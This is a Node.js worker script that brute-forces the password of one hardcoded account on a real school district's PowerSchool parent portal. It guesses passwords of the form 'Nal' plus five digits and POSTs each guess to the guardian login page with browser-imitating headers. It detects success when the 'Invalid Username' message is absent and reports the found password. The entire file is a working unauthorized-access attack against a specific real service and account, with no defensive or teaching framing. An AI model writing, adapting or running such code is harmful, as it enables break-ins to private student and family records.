const { parentPort, workerData } = require('worker_threads');

let id = "375630";
let pwPrefix = "Nal";

async function bruteForce(begin, end) {
  for (let i = begin; i < end; i++) {
    let pw = pwPrefix + i.toString().padStart(5, "0");
    let res;

    try {
      res = await await fetch("https://linnmar.powerschool.com/guardian/home.html", {
        "credentials": "include",
        "headers": {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.5",
          "Content-Type": "application/x-www-form-urlencoded",
          "Sec-GPC": "1",
          "Upgrade-Insecure-Requests": "1",
          "Sec-Fetch-Dest": "document",
          "Sec-Fetch-Mode": "navigate",
          "Sec-Fetch-Site": "same-origin",
          "Sec-Fetch-User": "?1",
          "Priority": "u=0, i"
        },
        "referrer": "https://linnmar.powerschool.com/public/",
        "body": `dbpw=${pw}&translator_username=&translator_password=&translator_ldappassword=&returnUrl=&serviceName=PS+Parent+Portal&serviceTicket=&pcasServerUrl=%2F&credentialType=User+Id+and+Password+Credential&ldappassword=${pw}&request_locale=en_US&account=${id}&pw=${pw}&translatorpw=`,
        "method": "POST",
        "mode": "cors"
      });

    } catch (e) {
      console.error(e);
      // Try again
      i--;
      continue;
    }

    const reader = res.body.getReader();
    let decoder = new TextDecoder();

    parentPort.postMessage(["progress", i - begin]);

    while (true) {
      const { done, value } = await reader.read();
      if (done) return ["password", pw];

      if (decoder.decode(value).includes("Invalid Username")) {
        break;
      }
    }
  }

  return ["Done", null];
}

bruteForce(workerData[0], workerData[1]).then((result) => {
  parentPort.postMessage(["result", result]);
});